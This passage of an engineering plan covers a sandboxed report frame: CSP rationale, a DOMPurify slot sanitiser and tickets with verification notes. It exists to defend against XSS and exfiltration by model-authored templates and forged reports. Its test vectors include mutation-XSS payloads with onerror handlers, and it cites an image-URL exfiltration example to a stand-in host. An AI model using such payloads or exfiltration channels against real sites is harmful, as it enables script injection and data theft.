never appear here or in `ReportPanel`'s attribute. With it absent the document has an **opaque
origin**: `window.origin === "null"`, no cookie access, no `localStorage`, no same-origin fetch back
into Wolf.

**2. `'unsafe-inline'` on `script-src`, which looks wrong and is not.** Two things need it, and
neither can be replaced by a nonce or a hash:

- **The template's own chart code is inline.** That is a settled property, not an accident:
  `structureHash` is sha256 of the stored bytes with *no* normalisation precisely because
  "whitespace inside a `<script>` body is semantically significant" (W16), which only matters
  because script bodies live in the template.
- **The series injection is inline by construction.** § W25 pins the contract as
  `window.__WOLF_SERIES__`, and W19 pins its position as the last child of `<head>`.

A **nonce** is per-request and a **hash** changes whenever the series data changes — i.e. daily.
Either would make the CSP string vary, which contradicts the byte-for-byte criterion this section
exists to satisfy, and would trade a real, checkable invariant for the appearance of hardening.

The security does not come from CSP restricting scripts. **It comes from there being no untrusted
script to restrict**: the template is reviewed by a human at go-live, frozen by `structureHash`, and
changeable only through an amendment; the daily content is sanitised into slots by `SLOT_PROFILE`,
from which every script, every event handler and every URL is absent. CSP's job here is the
*second* line — bound what a compromised or careless template can reach — and that is what the
`'none'` directives do.

⚠️ **If a later reader is tempted to remove `'unsafe-inline'`:** doing so silently disables every
chart in every report, and no test in the suite fails, because the tests assert the string and the
composition — not that a browser executed the chart. Only X1's happy-path leg would catch it.

### What is deliberately still reachable, and why that is bounded

`script-src` and `style-src` permit **any** `https:` origin, and `img-src`/`font-src` permit
`https:` and `data:`. That is a real egress channel — a URL can carry data in its path — and it is
open on purpose:

- W16 validates and **lists** every external script and stylesheet URL (`scriptSrcs`) *for the
  go-live review screen*, and a template with no `[data-wolf-fallback]` is a validation error
  because "a CDN failure is invisible inside an opaque frame". Both only make sense if CDN assets
  load. A CSP that blocked them would make that machinery dead code.
- Everything reachable through it is in the **template**, which a human read and approved once and
  which cannot change without an amendment. Nothing the daily tick writes can add a URL, because
  `SLOT_PROFILE` allows no URL-bearing attribute at all.

So the boundary is: **assets a human approved may load; data may not leave.** `connect-src 'none'`
kills `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource` and `navigator.sendBeacon`;
`form-action 'none'` kills form submission; `frame-src`/`child-src`/`worker-src 'none'` kill nested
browsing contexts and workers; `base-uri 'none'` stops a `<base>` from re-pointing relative URLs.

⚠️ **Two known gaps, recorded rather than papered over.** (a) A template author who wanted to
exfiltrate could still encode data into an `img` URL — but that author is the model whose output a
human reviewed and froze, which is the same trust boundary the whole locking design already rests
on. (b) `script-src https:` is an allow-any-origin list; a **pinned CDN allowlist** would be
strictly tighter and is the obvious future hardening. It is not done now because no ticket yet
knows which CDNs the reporting vocabulary settles on — W25 is where that becomes knowable, and
tightening this string is an owner decision at that point.

### Serving requirements

The header travels with `GET …/report/frame` alongside `X-Content-Type-Options: nosniff` and **no
`Set-Cookie`** (W21 asserts all three; the session middleware will otherwise refresh a cookie onto
this response). `ReportPanel` renders `sandbox="allow-scripts"` on the iframe as well — belt and
braces for the embedded case, with the CSP carrying the load for the direct-navigation case.


### W17: The slot sanitiser and template validation   [Status: done | Model: opus]
- **Scope:** `sanitiseSlot`, the strip counter, and `validateTemplate`. This is the security
  boundary of the whole feature.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/sanitise.ts`, `api/src/report/sanitise.test.ts`; modify
  `api/package.json`.
- **Acceptance criteria:**
  - `isomorphic-dompurify` is pinned at **`^2`** and is the only sanitiser dependency added.
  - `SLOT_PROFILE` is the **allow list** in § "The slot sanitiser profile, pinned as an ALLOW
    list", byte-for-byte. A test asserts `ALLOWED_TAGS` and `ALLOWED_ATTR` equal those literals, so
    a later widening is a deliberate, visible act.
  - **No URL survives a slot.** `img`, `a`, `src`, `href` and `style` are absent from the allow
    list; a test passes each and asserts it is gone. A remote `src` in a slot would be a daily,
    human-unreviewed egress channel.
  - A table test, one row per vector, covers `<script>`, `<iframe>`, `<object>`, `<embed>`,
    `<link>`, `<style>`, `<form>`, `<base>`, `<meta>`, every `on*` attribute, `javascript:` and
    `data:` URLs, and `srcdoc`. Each row asserts the dangerous token is **absent from the output
    string**, not merely that the output differs from the input.
  - **The same script text passes `validateTemplate` and is stripped by `sanitiseSlot`.** One test,
    both calls, asserting the asymmetry directly — the entire locking design rests on this.
  - `validateTemplate(html, maxBytes)` **never mutates and never returns HTML**; on success it
    returns the `ParsedTemplate` from W16's `parseTemplate`. A test asserts no exported function
    named `sanitiseTemplate` exists.
  - `strippedCount` counts removed **nodes and attributes**, and is zero for clean input.
  - `sanitiseSlot` is **idempotent** across the whole vector table — sanitising twice equals
    sanitising once. A non-idempotent sanitiser is a mutation-XSS smell.
  - Mutation-XSS regressions included: `<noscript><p title="</noscript><img src=x onerror=1>">`,
    `<svg><style><img src=x onerror=1>`, and a `<math>` wrapper.
  - A test asserts no second sanitiser is present: it reads every `package.json` in the repo and
    fails if `sanitize-html`, `xss`, `dompurify` (bare) or `sanitize-html-react` appears as a
    dependency. It checks **manifests, not source**, so the test cannot fail on its own text.
- **TDD:** yes.
- **Validation:** `cd api && yarn test && yarn typecheck` — 🔴 **the WHOLE api suite, corrected
  2026-08-26 (R117's sweep, first instance executed).** The single-path form was **proved**
  insufficient rather than merely suspected: `yarn test src/report/sanitise` ran **green** while
  `yarn test` ran **red**, because this ticket's own test file broke `api/src/import-boundary.test.ts`
  by containing the token `@import` (R145(2), fourth instance). This ticket also pulls **jsdom** into
  `api/`, and a filtered run cannot show that perturbation either. The blast radius is "any file in
  `api/`" and the whole suite runs in ~1.3s, so the whole suite IS the right filter here.
- **Depends on:** W16
- [x] done — verified 2026-08-26, two fix rounds. Merged to agent-wolf `main` as `b653faa`; main gated green after (api **33 files / 1440 tests**, web 31 / 347, 0 skipped, typechecks clean, `yarn build` clean). 🔴 **`yarn install` is required after this merge** — the lockfile carries `isomorphic-dompurify` but a stale `node_modules` does not, and the suite dies with `Cannot find package 'isomorphic-dompurify'` (the R132 pattern, third instance).
- Notes: Implemented `afe2256`, fix rounds `5b9657f` and `b64a9ba`. **Its verifier ran 46 mutations, verified every claim about DOMPurify against `dompurify@3.4.14` source AND by measurement, and threw 8,600 adversarial inputs at the sanitiser** — 60 hand-built mXSS/namespace/entity/comment vectors, 1,974 generated (every allowed tag × 20 payloads, 400-deep nesting, 50KB attributes) and 6,566 structural differentials including misnesting and adoption-agency shapes — with **a jsdom re-parse as the oracle rather than token matching**. **Zero escapes of any dangerous element, handler, URL or protocol; zero throws.** It also ran **R119's differential corpus live** for the first time (`parse5@8` arrives with jsdom): all 20 wrappers, `parseFragment(scriptingEnabled:true)` as oracle — **0 disagreements**, so R119's standing verifier instruction is discharged. **The implementer found two defects nobody else had, by EXECUTING the pinned profile against a 37-case corpus before writing a single test** — R146's own lesson applied, and R120's method repaid: **R147** (the profile's `#text` rationale was stale) and **R149** (a security-visibility hole that changed the pinned profile). It logged **50 guesses**, retracted one of its own findings on re-measurement (a `<body onload=>` handler **is** counted), and accepted a correction to another (`"@import url("` is a **weaker** string check than `"@import"`, not a stronger one). 🔴 **One real mutation escape:** nothing asserted text escaping, so `.replace(/&lt;/g, "<")` — a live XSS — left all 1348 tests green; closed in fix round 2 with both a token and a **fixed-point** assertion. Also closed: six of the seven `FORBID_CONTENTS` entries were guarded only by the literal pin, because every vector row used *element* children that `_isUnsafeNode` kills first; text-only children make them load-bearing (`template` is genuinely inert and stays on the pin). **Three findings recorded and not fixed** — `is=""` survives as an attribute *not* on `ALLOWED_ATTR` (DOMPurify voids rather than removes it), so the invariant "everything a slot may contain is on the allow list" is not literally true and **the HTML is a fixed point while the count is not**; non-idempotence on five `<p>`-wrapped-block shapes, converging at pass 2 with nothing dangerous riding it; and the raw-text-slot hand-off below.

### W18: Series selection and injection payload   [Status: done | Model: sonnet]
- **Scope:** `buildSeriesPayload` — choose metrics, downsample, shape the payload.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/series.ts`, `api/src/report/series.test.ts`.
- **Acceptance criteria:**
  - **Only metrics named in the locked spec are injected.** A dataset present in the project but
    absent from the spec never reaches the frame.
  - Points are downsampled to at most `maxPoints` per metric using largest-triangle-three-buckets,
    and the **first and last points are always retained** — a downsampler that drops the newest
    point hides the move the hypothesis is about.
  - Timestamps are epoch milliseconds in a field named **`tMs`**, matching the audit's pinned
    `Point = {tMs, v}` so the frame does not become the one place using a different name.
  - A metric whose dataset is missing appears with empty arrays and `version: 0`, **never absent**
    — an absent key makes the locked template's chart code throw, and the template cannot be fixed
    without an amendment.
  - The payload is JSON-serialisable with no `undefined`, and `</script>` is escaped: a series
    whose `unit` contains that string must not break out of the injection. Tested directly.
- **TDD:** yes.
- **Validation:** `cd api && yarn test src/report/series && yarn typecheck`
- **Depends on:** W15
- [x] done
- Notes: **Wave 6, 2026-08-21 — passed, zero fix rounds.** `ba2ab35`, two new files, nothing
  modified. Five mutations (leak non-spec datasets; drop the last point; drop the first point; omit the
  missing-dataset key; bare `JSON.stringify`) each turned the suite red; the verifier additionally
  checked the `</script>` defence at real HTML-parser level with jsdom (escaped → 1 script / 0 img; the
  bare-`JSON.stringify` control → 1 img, i.e. the naive path really does break out), confirmed `tMs`
  carries 13-digit epoch milliseconds rather than seconds in a millisecond-named field, and fuzzed the
  downsampler 2000 times with zero cap overshoot. Two **minor** items, neither blocking: the escaper
  neutralises `</script` but not the `<!--<script>` tokenizer state, which belongs to **W19** since W19
  owns the injection site; and the per-metric-budget test uses a single metric, so it would not catch an
  implementation that divided `maxPoints` across all metrics.

### W19: Frame composition and the CSP value   [Status: done | Model: opus]
- **Scope:** `composeFrame` — assemble the document, produce the CSP string.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/frame.ts`, `api/src/report/frame.test.ts`.
- **Acceptance criteria:**
  - 🔴 **REWRITTEN IN REVISION 5 — the CSP is DERIVED from the approved template, not constant.**
    `composeFrame` takes the template's `remoteOrigins` (W30) and emits the skeleton in
    `design/2026-08-24-agent-wolf-ui.md` § 6b with the sorted, space-joined origin list substituted
    at its **four** marked positions (`script-src`, `style-src`, `img-src`, `font-src`). The result
    is asserted **exactly**, as a string literal per case — a substring check satisfies nothing —
    with a table test over: **no** origins (yielding `script-src 'unsafe-inline'` with no host, the
    common case and strictly tighter than `https:`); one origin; several; the same origin
    arriving from two channels collapsing to one entry; and 🔴 **an origin present in
    `remoteOrigins` but absent from `scriptSrcs`, which must reach `img-src`/`font-src` and NOT
    `script-src`/`style-src`** — the R152 row, added 2026-08-26. **Mutation-proved by W19 to be the
    ONLY test that catches a regression to a single substituted list**: a four-row table leaves the
    amendment untested. Every non-substituted directive, including
    the leading `sandbox allow-scripts`, is byte-identical to the skeleton.
    *This replaces "equals the § 'The CSP header, byte-for-byte' value exactly". That section
    remains the skeleton's source and its per-clause rationale; it is no longer a whole literal.*
  - `composeFrame` owns the document skeleton (`<!doctype html>`, `<html>`, `<head>`, `<body>`);
    the template fragment is placed inside `<body>`.
  - **Every byte of the template fragment outside a `[data-wolf-slot]` element's children is
    emitted unchanged.** Asserted by composing a frame and diffing the template region against the
    stored bytes. *(This replaces an earlier "byte-identical" criterion that was impossible to
    satisfy alongside slot filling.)*
  - **The series injection sits at exactly one pinned position: the last child of `<head>`,
    immediately before `</head>`** — so it is assigned before any template script runs, and its
    position never depends on template content. Asserted by index.
  - Slot content is inserted **after** sanitisation; a test passes hostile slot content end to end
    and asserts the composed document contains none of it.
  - An unfilled slot renders as an empty element, never the literal string `undefined`.
- **TDD:** yes.
- **Validation:** `cd api && yarn test && yarn typecheck` — 🔴 **the WHOLE api suite (R117's sweep, second instance).** This ticket edits `template.ts` under Ruling 2, so `src/report/frame` alone cannot see the blast radius; W17 already proved a single-path filter green while the suite ran red.
- **Depends on:** W17, W18, **W30** *(revision 5: `composeFrame` derives the CSP from `remoteOrigins`)*
- [x] done — verified 2026-08-26, one fix round. Merged to agent-wolf `main` as `ae7e654`; main gated green after (api **34 files / 1548 tests**, web 31 / 347, typechecks clean, `yarn build` clean). No new dependency, so no `yarn install` is required after this merge.
- Notes: Implemented `dcf34b4`, amended to `352bdb6` (tests moved) and `025177c` (fix round 1). **Eight files, all additions bar four lines.** 🔴 **The CSP that shipped is NOT § 6b as written when this ticket was cut** — it substitutes **two** lists (R152, and R155 corrected the recipe: the `https:` entries of `scriptSrcs` only). Seven whole-string literals are asserted, and the R152 row — an origin in `remoteOrigins` but not `scriptSrcs` — is **mutation-proved to be the only test that catches a regression to one list**. The implementer found three defects in the rulings that dispatched it (R155, § 6b's "strict subset", R150(3)'s element count being five short) and one in a shipped ticket's hand-off (W18's `<!--<script>` gap, measured to swallow the entire template fragment including its `[data-wolf-fallback]`, and reachable from a model-chosen `Metric.unit`). Its verifier ran **51 mutations** in round 1 and **574 composed-document attacks** with a parse5 re-parse oracle, then **675** in round 2 with the oracle taught to detect a prototype leak; both rounds proved the harness red-capable first, and round 2's oracle controls were **seen to fire**. 🔴 **One blocking defect, and it had a sibling already on `main`:** an unguarded `slots[slot.id]` read put `function Object() { [native code] }` into a locked report with `strippedCount: 0` (**R156**) — and the same shape in merged `spec.ts`'s `present()` crashed `buildSeriesPayload` for **seven** legal metric slugs, falsifying W18's own criterion (**R160**, **R162**). Both fixed at the helper, not the call site. Also closed: an R133-shaped null row that left the whole suite green when its guard was deleted, and three byte-exactness mutations (`trimEnd`, `trimStart`, `toLowerCase`) that the `AWKWARD` fixture could not see — `toLowerCase` would have rewritten every template's inline chart code with 1521 tests green. **Ruled during the ticket:** `TemplateSlot` gains `tagName` (recovering it from byte offsets fails **open**); the two unfillable-element sets are deliberately different sizes (nine at validation, eleven at composition) and pinned in both directions; and the `api/src/report/*` ownership row was suspended for narrow additive edits to `template.ts`, `spec.ts` and `series.ts` plus their tests. **Recorded, not fixed:** `PROTOTYPE_SLUGS` in `series.test.ts` is a literal where `spec.test.ts` derives its list (drift caught only on the derived side), and R159's `iframe`/`plaintext` gap in `RAW_TEXT_ELEMENTS`.
- Notes: **Hand-off from W30 and W17, plus TWO ORCHESTRATOR RULINGS made 2026-08-26 before dispatch. Read all of it before starting.**

  🔴 **Correction to this ticket's own earlier hand-off note — R151.** A previous revision of this
  line claimed "`frame-src` and `form-action` are absent from the CSP skeleton entirely". **That is
  false.** Both appear in § 6b's skeleton, both as `'none'`, and so do `child-src`, `object-src`,
  `manifest-src`, `media-src` and `worker-src`. Do not "add" them. The **real** defect the note was
  reaching for is stated as Ruling 1 below. Seventeenth instance of the standing lesson: text the
  orchestrator writes between waves gets no adversarial pass.

  **RULING 1 — the CSP substitutes TWO lists, not one. This AMENDS `design/2026-08-24-agent-wolf-ui.md`
  § 6b.** § 6b prints a single `<ORIGINS>` placeholder at four positions, which means an origin that
  the template only ever *fetches an image from* — or only ever *navigates to* — is granted
  **script execution**. `remoteOrigins` is deliberately a superset that includes `meta[http-equiv=refresh]`
  targets and `object > param` values (W30, R118(2)); a navigation target is not code and must not
  become a script host. The data to fix it already exists and needs no W30 change:

  | Directive | Substitute | Why |
  | --- | --- | --- |
  | `script-src 'unsafe-inline' <CODE>` | `<CODE>` = sorted, deduplicated `new URL(u).origin` over the **`https:` entries of `scriptSrcs`** | `scriptSrcs` *is* "remote code and stylesheets a human approves **as code**" |
  | `style-src 'unsafe-inline' <CODE>` | `<CODE>`, the same list | `scriptSrcs` already carries stylesheet `href`s and CSS `@import` targets |
  | `img-src <ORIGINS> data:` | `<ORIGINS>` = **`remoteOrigins`**, verbatim (already sorted and deduplicated) | non-executable fetches; the broad list is correct here |
  | `font-src <ORIGINS> data:` | `<ORIGINS>`, the same list | as above |

  Every other directive stays byte-identical to § 6b's skeleton, **including the leading
  `sandbox allow-scripts` and the four that `default-src` does not cover** (`sandbox`, `base-uri`,
  `form-action`, `frame-ancestors`). `scriptSrcs` holds **absolute URLs in document order, neither
  deduplicated nor sorted** (`api/src/report/template.ts:105`) — W19 does that mapping itself, and
  must sort, because a CSP that varies with document order is not byte-stable for one template.
  🔴 **`scriptSrcs` is NOT https-only, and the naive mapping emits a CSP HOST NAME (R155).**
  `<style>@import url(data:text/css,x)</style>` validates clean and pushes a `data:` URL in;
  `new URL("data:…").origin` is the four characters `null`, which in a CSP is a **host name**, not
  the keyword `'none'`. `<script src="https:">` also validates and `new URL("https:")` **throws**.
  Mirror `template.ts`'s own `remoteOrigin`: strip tab/LF/CR, trim, require `^https:`, `new URL` in
  a try/catch.
  🔴 **Assert the superset invariant directly:** every origin derived from `scriptSrcs` is also in
  `remoteOrigins`. If that ever fails, W24's "everything else" set difference is wrong too.
  *Recorded as **R152**. Finer splitting — a stylesheet-only host not gaining `script-src` — needs
  W30 to tag each URL with its channel, and is a future hardening, not this ticket.*

  **RULING 2 — the raw-text slot is refused HERE, in both places, and is not handed on.** R150(3):
  a template declaring `data-wolf-slot` on a raw-text or script-like element is a breakout site that
  `validateTemplate` **accepts today**, and the exploit fails only because of a DOMPurify regex —
  nothing we wrote. 🔴 **The two sets are deliberately DIFFERENT SIZES — measured by W19; R150(3)
  named four elements and was five short.** `parseTemplate` refuses **nine**: `script`, `style`,
  `textarea`, `title`, `xmp`, `iframe`, `noembed`, `noframes`, `plaintext`. `noscript` and
  `template` are absent there because that file's **inert-element rule already refuses them**, so
  listing them would change only which message a human reads. `composeFrame`'s set carries
  **eleven** — both of those included — because that path has no inert rule in front of it, and both
  are load-bearing there. Pin the split by test in both directions, or the two sets drift.
  Refuse it twice:
  1. **At validation time, as a `TemplateError`** — a narrow, additive edit to
     `api/src/report/template.ts`. **The `api/src/report/*` ownership row is suspended for this one
     edit by orchestrator ruling:** that row exists to prevent concurrent collision, W30 and W17 are
     merged, and nothing else is in flight on the file. This is the load-bearing half — it stops the
     template ever being locked, rather than failing at render on a template that can then only be
     changed by amendment.
  **`TemplateSlot` gains `tagName: string`, set from the start tag at the moment the slot is
  recorded — approved 2026-08-26 as part of this ruling.** Half (2) is not implementable without it:
  recovering the tag from byte offsets means scanning back from `contentStart` for the opening `<`,
  which finds the wrong one whenever an attribute value contains a `<` (`<style title="x<div">`
  reads as `div`) — the **fail-open** direction on the one rule this ruling is about. It is the W30
  pattern: information the parser held and discarded.

  2. **At composition time, as a defensive check in `composeFrame`.** 🔴 **R148 applies: prove it can
     fail on its own or delete it.** It can — `composeFrame` takes a `ParsedTemplate`, so a
     hand-constructed one that never went through the validator reaches the guard. A test that only
     exercises it through `parseTemplate` is testing (1) twice and leaves (2) as a comment.

  **From W30 and W17, unchanged.** (a) `ParsedTemplate` carries **`remoteOrigins`** (deduplicated,
  sorted, origins only) *and* `scriptSrcs`, and they answer **different questions** — a
  `srcdoc`-hosted `<script src>` is in **both**; a meta-refresh target and an `object > param` value
  are in `remoteOrigins` **only**. (b) `validateTemplate` (W17) returns `parseTemplate`'s
  `ParsedTemplate` **whole**, so `remoteOrigins` reaches you untouched — no wiring needed.
  (c) 🔴 **The report panel's height contract and the `postMessage` prohibition are already
  implemented** by W14's `ReportFrameHost`; W23's `ReportPanel` is its **child**. Do not re-decide
  either — they are `web/`, and this ticket does not touch `web/` at all. (d) W18 left you one item:
  its `</script>` escaper neutralises `</script` but **not** the `<!--<script>` tokenizer state, and
  W18's Notes assign that to W19 because W19 owns the injection site.

### W20: Drift detection   [Status: done | Model: sonnet]
- **Scope:** `detectDrift` — orphan and unfilled slots.
- **Repo:** agent-wolf
- **Files:** create `api/src/report/drift.ts`, `api/src/report/drift.test.ts`.
- **Acceptance criteria:**
  - A slot id the tick filled but the template does not declare is an **orphan**; a slot the
    template declares but the tick left empty is **unfilled**. Both are reported; neither is
    silently dropped.
  - Drift is reported per hypothesis, so the UI shows one indicator.
  - An empty tick (no `report` memory at all) is **not** drift — it is the empty state, and the two
    must be distinguishable by the caller. A test asserts both shapes differ.
- **TDD:** yes.
- **Validation:** `cd api && yarn test src/report/drift && yarn typecheck`
- **Depends on:** W16
- [x] done
- Notes: **Wave 7 phase A, 2026-08-22 — passed, zero fix rounds, zero defects.** `6091d71`, two new
  files. Five mutations in a scratch copy — orphans dropped, unfilled dropped, the empty-tick shape
  collapsed, `hasDrift` inverted on null, the two arrays swapped — every one reddening the suite,
  including the collapse the plan singles out as the risk. The implementer's two-value API
  (`DriftResult = SlotDrift | null` for the caller who must branch, plus `hasDrift` for the badge)
  is what makes criterion 3 satisfiable at all, and `drift.ts` documents that `hasDrift` collapses
  the distinction **on purpose** so the escape hatch is signposted rather than a trap for W22. One
  authoring observation recorded as **R121**; one hand-off note for W22 as **R124**.

### W21: Report routes   [Status: pending | Model: opus]
- **Scope:** The three routes in § "HTTP routes added", including fetching the datasets the frame
  injects.
- **Repo:** agent-wolf
- **Files:** create `api/src/routes/report.ts`, `api/src/routes/report.test.ts`; modify
  `api/src/app.ts`.
- **Acceptance criteria:**
  - **The CSP the route emits is the one `composeFrame` derived for THAT template** (revision 5,
    W19). A test writes two templates with different `remoteOrigins` and asserts the two responses
    carry different `Content-Security-Policy` headers — a route that emits a constant policy fails
    this criterion even though every W19 test passes.
  - `GET …/report/frame` returns `text/html`, the exact CSP header **including `sandbox
    allow-scripts`**, `X-Content-Type-Options: nosniff`, and **no `Set-Cookie`** — asserted
    explicitly, because the session middleware will otherwise refresh a cookie onto this response.
  - **A route-level test proves no credential reaches the frame.** It drives the real app with a
    config holding recognisable fake values for the Wolf API key and an embed token, requests a
    frame, and asserts neither string appears anywhere in the body or headers. This is the test the
    threat model rests on; it must not be deleted or weakened to a unit test of `composeFrame`,
    which is a pure function that cannot see config at all.
  - The route fetches each spec metric's dataset through the dataset read path and **gates on
    `version`**, serving a cached payload when the version is unchanged — without this the frame
    re-downloads every CSV on every page view.
  - The frame request is authenticated like every other route; the frame's *contents* carry no
    credential, but the *request for it* is authenticated.
  - `404` when no template exists, with a body the UI distinguishes from a server error.
  - `POST …/report-template` writes through Wolf's server credential so provenance is empty, and
    returns **409** if a locked template already exists — the amendment route is the only
    replacement path.
  - `POST …/report-amendment` with `decision: "accept"` re-validates the proposed HTML and then
    writes a new `report-template`; a proposal failing validation is **422** and no template is
    written.
  - Every failure is a `WolfError` with the right `kind`; an unhandled throw maps to `internal`,
    never `unavailable` (main plan § "Shared error taxonomy", R39).
- **TDD:** yes.
- **Validation:** `cd api && yarn test && yarn typecheck` — 🔴 **the WHOLE api suite (R117's sweep, third instance).** This ticket modifies `api/src/app.ts`, so the blast radius is every route test in the module, and a `src/routes/report` filter cannot see any of it. W17 and W19 both proved a filtered run green while the suite ran red.
- **Depends on:** W19, W20, W8, W11
- [ ] done
- Notes:

### W22: Board integration and cross-hypothesis defence   [Status: pending | Model: opus]
- **Scope:** The third board read, the headline, the detail payload's report block, and the
  provenance check that keeps one hypothesis out of another's report.
- **Repo:** agent-wolf
- **Files:** modify `api/src/hypothesis/store.ts`, `api/src/routes/hypotheses.ts`, and their tests.
- **Acceptance criteria:**
  - The board issues **exactly three** `latest_per` requests regardless of hypothesis count. A test
    with twelve hypotheses asserts the request count is three.
  - 🔴 **A `kind=report` or `kind=report-candidate` memory whose provenance does not name that
    hypothesis's own researcher worker or its `hyp-<id>` session is IGNORED, not rendered, and
    surfaces as `tamper`.** Labels are chosen entirely by the caller, so a researcher session for
    `hyp-A` can otherwise append `kind=report, name=hyp-B` and own hypothesis B's headline and
    panel. A test does exactly that and asserts B's headline is unchanged and B reports tamper.
    Without this criterion the feature's isolation claim is false.
  - `headline` comes from line 1 of the `kind=report` snippet; a hypothesis with no report yet gets
    `headline: null`, never `""`, so the UI distinguishes "nothing yet" from "said nothing".
  - `GET /api/hypotheses/:id` returns the `report` block exactly as pinned in § "The detail route's
    report block, pinned" — snake_case keys, `updated_at_ms`, `drift.orphan_slots`,
    `drift.unfilled_slots`.
  - A forged `report-template` (non-empty provenance) yields `tamper` and the frame route then
    serves **404** rather than the forged template.
  - A `report-template` hidden by a retraction whose own provenance is non-empty is still served,
    and carries `tamper` naming the retractor — reusing W15's store reads, not a second code path.
  - 🔴 **R45 CLOSES HERE, NOT IN W9 (revision 5).** The report-layer amendment says go-live refuses a
    hypothesis with no `report-template`, and W21 is the only writer of one — which read as a cycle.
    It is not: go-live has never required a template in code, and W24 → W23 → W22 → W21 means the
    writer exists before the gate does. **This ticket adds the requirement**, in the one place the
    plan already puts the other half of the gate: `report.has_template` is already the first field
    of the pinned report block, so `GET /api/hypotheses/:id` now carries **both** halves —
    `spec_validation.valid` and `report.has_template` — and W24's button is enabled iff both hold.
    This ticket also adds the **server-side `422` backstop** on `POST …/go-live` for the race, with
    a `path` of `report.has_template`. **W9 is not reopened.**
- **TDD:** yes.
- **Validation:** `cd api && yarn test src/hypothesis/store src/routes/hypotheses && yarn typecheck`
- **Depends on:** W21
- [ ] done
- Notes:

### W23: VerdictBand and ReportPanel   [Status: pending | Model: sonnet]
- **Scope:** The detail page's new upper half, plus the drift indicator.
- **Repo:** agent-wolf
- **Files:** create `web/src/components/{VerdictBand,ReportPanel,ReportDrift}.tsx` and tests;
  modify `web/src/pages/HypothesisDetail.tsx`, `web/package.json`.
- **Acceptance criteria:**
  - `web/package.json` gains a component-testing library — **`@testing-library/react` 16.x** with
    `@testing-library/jest-dom` — because `web/` currently ships only `vitest` and `jsdom` and the
    criteria below cannot otherwise be written. *(If W13 has already added it, this is a no-op;
    do not add a second one.)*
  - 🔴 **`ReportPanel` renders `sandbox="allow-scripts"` and the rendered attribute does NOT
    contain `allow-same-origin`.** Asserted on the DOM attribute string, with a comment naming why:
    adding `allow-same-origin` alongside `allow-scripts` converts a bounded risk into a session
    compromise. This is the highest-value test in the feature.
  - A test asserts `dangerouslySetInnerHTML` appears nowhere under `web/src` **excluding the
    asserting test file itself**, so the check cannot fail on its own text.
  - No report → an explicit empty state naming why ("no report yet — the first tick has not run"),
    never a blank frame.
  - `stripped_count > 0` and drift each render as **`Severity level="degraded"`** (revision 5,
    from W28) with a **mandatory cause sentence** — the count for the first, the orphan and unfilled
    slot names for the second. `Severity` refuses to render without a cause; a bare marker that does
    not say what happened is how a spec mistake stays invisible for three weeks.
  - **`ReportPanel` sits inside `Provenance kind="model"`** with the writer's stamp above it — the
    frame is model-authored content and the interface says so, calmly. The provenance ground uses
    **no semantic palette colour**; borrowing `warning` or `error` here would make every healthy
    report read as a problem and is asserted against in W28.
  - **The panel's height is fixed and never negotiated** — the rule and the
    `postMessage` prohibition are W14's; this ticket implements the component that obeys them.
  - `VerdictBand` renders status, score and the tripped/holding/**indeterminate** counts, with
    `indeterminate` visually distinct from `holding` — the same rule W14 applies to the condition
    table, for the same reason. The word is `indeterminate` throughout; never "unknown".
  - `VerdictBand` carries an explicit note that the score summarises and does not decide.
- **TDD:** yes for the sandbox attribute, the empty state and the notices; no for layout.
- **Validation:** `cd web && yarn test && yarn typecheck`
- **Depends on:** W22, W14
- [ ] done
- Notes: **Hand-off from W14 (2026-08-24), read before starting.** (1) 🔴 **`ReportPanel` is `ReportFrameHost`'s CHILD, not a peer.** W14 ships the host, which owns `height: clamp(480px, 70vh, 900px)`, internal scroll, the expand dialog and the proof that a `postMessage` height is ignored — the ordering deadlock between the two tickets was resolved that way (both tickets previously said the other owned the height rule). W23 owns `sandbox="allow-scripts"` with **no `allow-same-origin`**, still the highest-value test in the feature. The host mounts its child in **exactly one place at a time**, so you get one live frame; `HypothesisDetail.tsx` marks the seam with two comments and a `report-placeholder` `<Typography>` that W23 deletes. (2) 🔴 **`VerdictActions` (W14) is a different component from `VerdictBand` (W23)** — compose the band above it; do not fold the buttons in. (2b) 🔴 **`stripped_count`'s SIGN is the contract; its magnitude is not** — it counts DOMPurify *records*, so a library upgrade moves the number with no behaviour change. Render it magnitude-agnostically ("content was removed from this report (3 items)", never "3 items removed" as though it were an inventory). **R149**. (3) 🔴 **Import `format.ts` and `reasons.ts`** rather than rolling a second date helper or a second gloss table. (4) `Provenance`/`Severity` come from `web/src/components/trust/` — both **default** exports; `Severity` **throws in dev without a non-empty cause**, so `stripped_count` and drift each need their sentence. (5) `ConditionTable` takes a `testId` prop and **two instances already coexist** on the page (`condition-table` and `case-conditions`) — do not assume one. (6) The provenance stamp for the report panel is the **caller's** wrapper: the host does not know the report's writer. (7) `ReportFrameHost` renders in **every** lifecycle state including `draft`, so its empty state — which W23 owns — is what a pre-go-live hypothesis shows. (8) 🔴 **Stub `window.matchMedia`** for any responsive assertion (**R139**), and remember `testUtils.tsx`'s `stubFetchRoutes` **throws on unrouted paths**. (9) The testing library is already installed — W23's "adds `@testing-library/react`" criterion is a **no-op**; do not add a second copy or change the exact `6.9.1` jest-dom pin (**R135**).

### W24: Go Live review screen   [Status: pending | Model: sonnet]
- **Scope:** The screen where a human approves a candidate report before go-live.
- **Repo:** agent-wolf
- **Files:** create `web/src/pages/GoLiveReview.tsx` and its test; modify `web/src/App.tsx`.
- **Acceptance criteria:**
  - The screen reads the newest `kind=report-candidate` for the hypothesis — that is the transport
    by which the interview's proposed template leaves the container — and renders its HTML.
  - The candidate renders **inside the real frame component**, with the real CSP and the real
    sandbox. Reviewing a preview that differs from production defeats the purpose of reviewing.
  - 🔴 **EVERY remote host is listed above the preview, not only the executable ones (revision 5).**
    `scriptSrcs` covers `script[src]`, `link[rel=stylesheet][href]` and CSS `@import` — so a template
    that exfiltrates through `img src="https://evil.example/?d=…"` was approved by a human who never
    saw that host. The screen therefore lists **`remoteOrigins`** (W30) as well: every origin the
    template will contact, from every channel W16's validator already walks. A test approves a
    template whose only remote URL is an `img` and asserts its origin appears on screen.
  - The external script and stylesheet URLs (`scriptSrcs`) are listed explicitly above the preview,
    distinguished from the rest of `remoteOrigins`. The human is approving remote **code**; they are
    shown exactly what it is, and separately what else will be fetched.
  - The Go Live button is disabled until the spec validates **and** a template has been accepted,
    with the blocking reasons listed. Neither condition alone enables it.
  - Accepting posts the candidate's HTML to `POST …/report-template` and surfaces a `422` as
    per-path errors.
